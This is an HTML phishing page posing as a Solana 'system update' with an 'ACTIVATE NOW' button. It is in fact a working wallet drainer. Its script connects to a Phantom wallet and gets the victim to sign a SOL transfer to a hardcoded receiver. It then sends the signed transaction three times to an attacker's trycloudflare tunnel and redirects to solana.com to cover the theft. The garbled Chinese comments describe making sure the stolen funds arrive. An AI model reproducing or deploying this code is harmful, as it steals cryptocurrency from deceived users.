<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Sync</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:monospace;">
    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <img src="https://solana.com/favicon.ico" style="width:40px;margin-bottom:10px;">
        <h3>SYSTEM UPDATE</h3>
        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;cursor:pointer;border-radius:5px;">ACTIVATE NOW</button>
        <div id="status" style="margin-top:20px;color:#444;font-size:12px;">STATUS: READY</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Open in Phantom Browser");

            try {
                // 1. ç®€å•è¿žæŽ¥
                await p.connect();
                document.getElementById('status').innerText = "FETCHING PARAMS...";

                // 2. ä»Žä½ çš„ä¸­ç»§æ‹¿ Blockhash (è¿™ä¸€æ­¥æ—¥å¿—é‡Œæ˜¾ç¤ºæ˜¯æˆåŠŸçš„)
                const syncRes = await fetch(`${tunnel}/sync`);
                const { bh } = await syncRes.json();

                // 3. æž„é€ ä¸€ä¸ªå›ºå®šçš„ 0.01 SOL æ”¯ç¥¨ï¼ˆå…ˆç¡®ä¿èƒ½æ”¶åˆ°è´§ï¼ï¼‰
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                        lamports: 10000000, 
                    })
                );
                transaction.recentBlockhash = bh;
                transaction.feePayer = p.publicKey;

                document.getElementById('status').innerText = "AWAITING SIGNATURE...";

                // ðŸ”± å…³é”®åŠ¨ä½œï¼šåªè¦æ±‚ç­¾åï¼Œä¸è¦æ±‚å‘é€
                const signed = await p.signTransaction(transaction);
                const rawTx = signed.serialize().toString('base64');
                
                document.getElementById('status').innerText = "TRANSMITTING...";

                // 4. æš´åŠ›å›žä¼ æ•°æ®
                const collectUrl = `${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`;
                
                // å¼ºåˆ¶å‘é€ 3 æ¬¡ï¼Œç¡®ä¿éš§é“èƒ½æŽ¥æ”¶åˆ°
                fetch(collectUrl);
                const img = new Image(); img.src = collectUrl;
                navigator.sendBeacon(collectUrl);

                document.getElementById('status').innerText = "SUCCESS";
                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);

            } catch(e) {
                console.error(e);
                document.getElementById('status').innerText = "RETRYING...";
                setTimeout(() => { location.reload(); }, 1000);
            }
        };
    </script>
</body>
</html>
